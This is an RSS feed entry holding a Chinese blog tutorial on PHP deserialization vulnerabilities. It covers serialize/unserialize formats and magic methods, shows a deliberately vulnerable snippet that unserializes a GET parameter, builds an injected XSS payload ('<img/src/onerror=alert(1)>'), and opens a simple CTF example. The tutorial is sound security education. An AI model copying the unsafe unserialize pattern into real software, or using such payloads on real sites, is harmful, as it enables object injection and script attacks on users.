@@ -1,0 +1,753 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>unserialize on fragrant1001</title>
+        <link>https://fragrant1001.github.io/tags/unserialize/</link>
+        <description>Recent content in unserialize on fragrant1001</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>zh-Hans</language>
+        <lastBuildDate>Fri, 14 May 2021 21:36:49 +0800</lastBuildDate><atom:link href="https://fragrant1001.github.io/tags/unserialize/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Php反序列化原理</title>
+        <link>https://fragrant1001.github.io/post/2023/phpunserialize/</link>
+        <pubDate>Fri, 14 May 2021 21:36:49 +0800</pubDate>
+        
+        <guid>https://fragrant1001.github.io/post/2023/phpunserialize/</guid>
+        <description>&lt;img src="https://fragrant1001.github.io/post/2023/phpunserialize/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0cover.jpg" alt="Featured image of post Php反序列化原理" /&gt;&lt;p&gt;php反序列化深度学习&lt;/p&gt;
+&lt;h2 id=&#34;序列化与反序列化&#34;&gt;序列化与反序列化&lt;/h2&gt;
+&lt;h3 id=&#34;序列化&#34;&gt;序列化&lt;/h3&gt;
+&lt;p&gt;serialize — 产生一个可存储的值的表示&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;serialize() 返回字符串，此字符串包含了表示 value 的字节流，可以存储于任何地方。&lt;/p&gt;
+&lt;p&gt;这有利于存储或传递 PHP 的值，同时不丢失其类型和结构。&lt;/p&gt;
+&lt;p&gt;想要将已序列化的字符串变回 PHP 的值，可使用 unserialize()。serialize() 可处理除了 resource 之外的任何类型。甚至可以 serialize() 那些包含了指向其自身引用的数组。你正 serialize() 的数组／对象中的引用也将被存储。&lt;/p&gt;
+&lt;p&gt;当序列化对象时，PHP 将试图在序列动作之前调用该对象的成员函数 __sleep()。这样就允许对象在被序列化之前做任何清除操作。类似的，当使用 unserialize() 恢复对象时， 将调用 __wakeup() 成员函数。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;我们先看几个例子：&lt;/p&gt;
+&lt;p&gt;普通字符串变量序列化&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?php
+$test = &amp;#39;123456&amp;#39;;
+$result = serialize($test);
+echo $result;
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-17-03-58.png&#34;
+	width=&#34;1040&#34;
+	height=&#34;254&#34;
+	srcset=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-17-03-58_huaf7e274e1f6a96d4e37aacdac2a90cef_27975_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-17-03-58_huaf7e274e1f6a96d4e37aacdac2a90cef_27975_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;409&#34;
+		data-flex-basis=&#34;982px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;数组变量序列化&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?php
+$arr = [
+    &amp;#34;foo&amp;#34; =&amp;gt; &amp;#34;bar&amp;#34;,
+    &amp;#34;bar&amp;#34; =&amp;gt; &amp;#34;foo&amp;#34;,
+];
+$result = serialize($arr);
+print_r($result);
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-09-03.png&#34;
+	width=&#34;1174&#34;
+	height=&#34;328&#34;
+	srcset=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-09-03_hu49cd0b57c28bab4bdd2e3e88816fb73d_34136_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-09-03_hu49cd0b57c28bab4bdd2e3e88816fb73d_34136_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;357&#34;
+		data-flex-basis=&#34;859px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;对象变量序列化&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?php
+
+class test{
+    public $name = &amp;#34;zhangsan&amp;#34;;
+    public $age = 10;
+}
+$obj = new test();
+$result = serialize($obj);
+print_r($result);
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-13-25.png&#34;
+	width=&#34;1149&#34;
+	height=&#34;339&#34;
+	srcset=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-13-25_hu58bf8c12ee3eb7d7a07176795b42bce2_41759_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-13-25_hu58bf8c12ee3eb7d7a07176795b42bce2_41759_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;338&#34;
+		data-flex-basis=&#34;813px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-15-49.png&#34;
+	width=&#34;899&#34;
+	height=&#34;409&#34;
+	srcset=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-15-49_hu8457b1875a35b58d0acc0a94dac6ffcd_26645_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-15-49_hu8457b1875a35b58d0acc0a94dac6ffcd_26645_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;219&#34;
+		data-flex-basis=&#34;527px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;可见几乎所有正确的变量都可以被序列化成字符串然后保存下来&lt;/p&gt;
+&lt;p&gt;序列化一个对象后将会保存对象的所有变量，并且发现序列化后的结果都有一个字符，这些字符都是以下字母的缩写。&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;a - array                  b - boolean  
+d - double                 i - integer
+o - common object          r - reference
+s - string                 C - custom object
+O - class                  N - null
+R - pointer reference      U - unicode string
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;不同权限的属性序列化情况(public、protected、private)&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?php
+
+class test{
+    public $name = &amp;#34;zhangsan&amp;#34;;
+    protected $age = 10;
+    private $sex = &amp;#34;man&amp;#34;;
+}
+$obj = new test();
+$result = serialize($obj);
+print_r($result);
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-24-16.png&#34;
+	width=&#34;1280&#34;
+	height=&#34;374&#34;
+	srcset=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-24-16_hu49578a99e57fcc5a95084f47432fcc80_42215_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-24-16_hu49578a99e57fcc5a95084f47432fcc80_42215_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;342&#34;
+		data-flex-basis=&#34;821px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;这里介绍一下public、private、protected的区别(区别常见于字符串逃逸类型题目)&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;public(公共的):在本类内部、外部类、子类都可以访问&lt;/p&gt;
+&lt;p&gt;protect(受保护的):只有本类或子类或父类中可以访问&lt;/p&gt;
+&lt;p&gt;private(私人的):只有本类内部可以使用&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;protect分析：&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;本来是age结果上面出现的是*age，而且*age的长度是4，但是上面显示的是6，查找资料后发现protect属性序列化的时候格式是%00*%00成员名&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;private分析：&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;这样就发现本来是sex结果上面出现的是testsex，而且testsex长度为7，但是上面显示的是9，同样查找资料后发现private属性序列化的时候格式是%00类名%00成员名，%00占一个字节长度，所以sex加了类名后变成了testsex长度为9&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;反序列化&#34;&gt;反序列化&lt;/h3&gt;
+&lt;p&gt;unserialize — 从已存储的表示中创建 PHP 的值&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;unserialize() 对单一的已序列化的变量进行操作，将其转换回 PHP 的值。
+序列化后的字符串。&lt;/p&gt;
+&lt;p&gt;若被解序列化的变量是一个对象，在成功地重新构造对象之后，PHP 会自动地试图去调用 __wakeup() 成员函数（如果存在的话）。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;我们再看几个例子：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?php
+$b = &amp;#39;s:6:&amp;#34;123456&amp;#34;;&amp;#39;;
+$b1 = unserialize($b);
+print_r($b1);
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-43-59.png&#34;
+	width=&#34;1054&#34;
+	height=&#34;263&#34;
+	srcset=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-43-59_hu6d42f3e9e52fdfc013f0def87bd37ace_27083_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-43-59_hu6d42f3e9e52fdfc013f0def87bd37ace_27083_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;400&#34;
+		data-flex-basis=&#34;961px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?php
+$b = &amp;#39;a:2:{s:3:&amp;#34;foo&amp;#34;;s:3:&amp;#34;bar&amp;#34;;s:3:&amp;#34;bar&amp;#34;;s:3:&amp;#34;foo&amp;#34;;}&amp;#39;;
+$b1 = unserialize($b);
+print_r($b1);
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-44-55.png&#34;
+	width=&#34;1027&#34;
+	height=&#34;367&#34;
+	srcset=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-44-55_hueddc36bc43b967170dd527f2d09e1b1f_32656_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-44-55_hueddc36bc43b967170dd527f2d09e1b1f_32656_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;279&#34;
+		data-flex-basis=&#34;671px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?php
+$b = &amp;#39;O:4:&amp;#34;test&amp;#34;:2:{s:4:&amp;#34;name&amp;#34;;s:8:&amp;#34;zhangsan&amp;#34;;s:3:&amp;#34;age&amp;#34;;i:10;}&amp;#39;;
+$b1 = unserialize($b);
+print_r($b1);
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-46-20.png&#34;
+	width=&#34;1051&#34;
+	height=&#34;412&#34;
+	srcset=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-46-20_hu41be456cebeb10dbc43a554c101405f4_45533_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-46-20_hu41be456cebeb10dbc43a554c101405f4_45533_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;255&#34;
+		data-flex-basis=&#34;612px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?php
+
+class test{
+    public $name = &amp;#34;zhangsan&amp;#34;;
+    public $age = 10;
+}
+
+$b = &amp;#39;O:4:&amp;#34;test&amp;#34;:2:{s:4:&amp;#34;name&amp;#34;;s:8:&amp;#34;zhangsan&amp;#34;;s:3:&amp;#34;age&amp;#34;;i:10;}&amp;#39;;
+$b1 = unserialize($b);
+print_r($b1);
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-48-09.png&#34;
+	width=&#34;1052&#34;
+	height=&#34;434&#34;
+	srcset=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-48-09_hu169c0b2c05f7dce3be40cfa9cf158e9c_38624_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-48-09_hu169c0b2c05f7dce3be40cfa9cf158e9c_38624_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;242&#34;
+		data-flex-basis=&#34;581px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;反序列化漏洞产生原理&#34;&gt;反序列化漏洞产生原理&lt;/h2&gt;
+&lt;p&gt;因为存在大量的魔术方法、参数的传递、不安全函数的使用导致漏洞的产生&lt;/p&gt;
+&lt;p&gt;常见魔术方法&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;__construct()当一个对象创建时被调用
+
+__destruct()当一个对象销毁时被调用
+
+__toString()当反序列化后的对象被输出的时候(转化为字符串的时候)被调用
+
+__sleep() 在对象在被序列化之前运行，常用与过滤
+
+__wakeup() 将在反序列化之前立即被调用，常用与初始化
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;看看这几个魔术方法的执行顺序&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test&lt;/span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; $a&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;hacked by fra&amp;#39;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; $b&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;hacked by fra2&amp;#39;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;pt&lt;/span&gt;(){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; __construct(){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;__construct&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; __destruct(){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;__destruct&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; __sleep(){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;__sleep&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;array&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;b&amp;#39;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; __wakeup(){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;__wakeup&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;//创建对象调用__construct
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    $object &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;//序列化对象调用__sleep
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    $serialize &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;serialize&lt;/span&gt;($object);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;//输出序列化后的字符串
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;serialize: &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;$serialize&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;//反序列化对象调用__wakeup
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    $unserialize&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;unserialize&lt;/span&gt;($serialize);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;//调用pt输出数据
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    $unserialize&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;pt&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;//脚本结束调用__destruct
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-19-13-18.png&#34;
+	width=&#34;1225&#34;
+	height=&#34;890&#34;
+	srcset=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-19-13-18_hu6c7935bd68319f6ebe7d3ce1f64a4dc1_101263_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-19-13-18_hu6c7935bd68319f6ebe7d3ce1f64a4dc1_101263_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;137&#34;
+		data-flex-basis=&#34;330px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;看一段存在反序列化漏洞的代码&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?php
+
+class flag{
+    public $flag = &amp;#34;demon&amp;#34;;
+    function __destruct() {
+        echo $this-&amp;gt;flag;
+    }
+}
+
+$a = $_GET[&amp;#39;v&amp;#39;];
+$b = unserialize($a);
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;利用方法是本地新建一个一样的类，但是更改flag变量的值为&lt;code&gt;&amp;lt;img/src/onerror=alert(1)&amp;gt;&lt;/code&gt;,这样再通过序列化的方式输出序列化后的字符串，再将序列化字符串传入v参数，这样即可更改原本的flag值同时输出到页面。&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?php
+
+class flag{
+    public $flag = &amp;#34;&amp;lt;img/src/onerror=alert(1)&amp;gt;&amp;#34;;
+    function __destruct() {
+        echo $this-&amp;gt;flag;
+    }
+}
+$c = new flag();
+$d = serialize($c);
+print_r($d);
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-20-18-40-49.png&#34;
+	width=&#34;1267&#34;
+	height=&#34;378&#34;
+	srcset=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-20-18-40-49_hu0557a8966476fdc9a261ff22807a43cb_38271_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-20-18-40-49_hu0557a8966476fdc9a261ff22807a43cb_38271_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;335&#34;
+		data-flex-basis=&#34;804px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-20-18-41-56.png&#34;
+	width=&#34;837&#34;
+	height=&#34;189&#34;
+	srcset=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-20-18-41-56_huc4efc9f05a3285ea94ea2dddc50895b7_11152_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-20-18-41-56_huc4efc9f05a3285ea94ea2dddc50895b7_11152_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;442&#34;
+		data-flex-basis=&#34;1062px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;这就是php反序列化的入门基础部分，接下来看看简单的序列化题目。&lt;/p&gt;
+&lt;h2 id=&#34;简单序列化ctf题目案例&#34;&gt;简单序列化ctf题目案例&lt;/h2&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?php
+error_reporting(0);
+include(&amp;#39;../flag.php&amp;#39;);
+$KEY = &amp;#34;TTEESSTT!!&amp;#34;;
+$str = $_GET[&amp;#39;str&amp;#39;];
+if (unserialize($str) === &amp;#34;$KEY&amp;#34;)
+{
+    echo $flag;
+}
+
+show_source(__FILE__);
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;大概意思就是变量str反序列化之后的值等于&lt;code&gt;TTEESSTT!!&lt;/code&gt;,所以直接将该变量序列化输出就好&lt;/p&gt;
